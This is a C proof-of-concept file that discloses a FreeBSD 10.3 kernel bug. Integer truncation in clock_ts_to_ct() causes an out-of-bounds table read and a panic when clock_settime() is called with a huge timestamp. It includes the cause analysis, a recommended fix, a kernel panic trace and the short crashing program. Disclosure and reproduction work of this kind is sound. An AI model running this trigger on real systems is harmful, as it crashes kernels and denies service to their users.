/*
 * crash_clock_settime.c 
 *         Panic the kernel with a call to clock_settime().
 *

Synopsis:
Integer truncation issues lead to out-of-bounds kernel reads and panics in clock_settime().

Cause:
Integer truncation issues in clock_ts_to_ct() result in out-of-bounds
results.  These results are trusted by atrtc_settime() which calls
bin2bcd(ct.day).  bin2bcd is implemented with a table lookup, and
when ct.day is out-of-bounds, it results in an out-of-bounds read
to the bin2bcd_data[] table.  This can lead to a page fault in the
kernel and a panic. To trigger this issue you must have the
PRIV_CLOCK_SETTIME privilege.

Specifically when ts->tv_sec is large or negative on 64-bit platforms,
the clock_ts_to_ct function calculations:
    days = secs / SECDAY;
can result in an incorrect value that is negative.  This can later result
in several incorrect calculations in the result including
    ct->dow = day_of_week(days);
which performs a modulus operation on a negative value, an integer
overflow in ct->year, and an out-of-range value in ct->day,
    ct->hour = rsec / 3600;
    rsec = rsec % 3600;
    ct->min  = rsec / 60;
    rsec = rsec % 60;
    ct->sec  = rsec;
and out-of-range values for ct->min and ct->sec (due to modulus
operations on negative values).

Verified on FreeBSD 10.3-RELEASE kernel on amd64 platform with
QEMU "hardware".

Recommendation:
The "years" and "days" variables in clock_ts_to_ct() should be
"long" and not "int".  This function should not be called when
the input "ts.tv_sec" field is negative, or it should return an
error, or the function should be updated to properly handle negative
second values.  It should be carefully written to avoid signed-overflows 
and signed-modulus operations in this case.

Reproduction:
# cc -Wall crash_clock_settime.c -o crash_clock_settime
# ./crash_clock_settime
Fatal trap 12: page fault while in kernel mode
cpuid = 0; apic id = 00
fault virtual address	= 0xffffffff7eab4242
fault code		= supervisor read data, page not present
instruction pointer	= 0x20:0xffffffff80e6e6c8
stack pointer	        = 0x28:0xfffffe00002169d0
frame pointer	        = 0x28:0xfffffe0000216a10
code segment		= base 0x0, limit 0xfffff, type 0x1b
			= DPL 0, pres 1, long 1, def32 0, gran 1
processor eflags	= interrupt enabled, IOPL = 0
current process		= 22 (a.out)
trap number		= 12
panic: page fault
cpuid = 0
KDB: stack backtrace:
#0 0xffffffff8098e390 at kdb_backtrace+0x60
#1 0xffffffff80951066 at vpanic+0x126
#2 0xffffffff80950f33 at panic+0x43
#3 0xffffffff80d55f7b at trap_fatal+0x36b
#4 0xffffffff80d5627d at trap_pfault+0x2ed
#5 0xffffffff80d558fa at trap+0x47a
#6 0xffffffff80d3b8d2 at calltrap+0x8
#7 0xffffffff809993f1 at resettodr+0xc1
#8 0xffffffff80963ea0 at settime+0x180
#9 0xffffffff80963c96 at sys_clock_settime+0x86
#10 0xffffffff80d5694f at amd64_syscall+0x40f
#11 0xffffffff80d3bbbb at Xfast_syscall+0xfb

Reported: 2016-11-07
https://bugs.freebsd.org/bugzilla/show_bug.cgi?id=214300
 */

#include <stdio.h>
#include <time.h>

int 
main(int argc, char **argv)
{
    struct timespec ts = { 0x557206f85556568, 0 };
    int x = clock_settime(CLOCK_REALTIME, &ts);
    printf("return %d\n", x);
    return 0;
}

